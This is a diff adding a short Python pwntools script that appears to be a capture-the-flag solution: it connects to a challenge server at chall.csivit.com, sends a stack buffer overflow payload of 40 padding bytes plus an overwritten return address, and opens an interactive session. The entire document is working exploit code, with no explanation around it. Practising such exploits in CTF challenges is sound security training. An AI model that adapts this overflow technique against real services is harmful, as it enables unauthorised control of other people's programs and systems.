@@ -1,0 +1,10 @@
+#!/usr/bin/env python3
+
+import pwn
+
+r = pwn.remote('chall.csivit.com', 30013)
+
+payload = "A"*40 + '\xce\x11@\x00\x00\x00\x00\x00'
+
+r.sendline(payload)
+r.interactive()
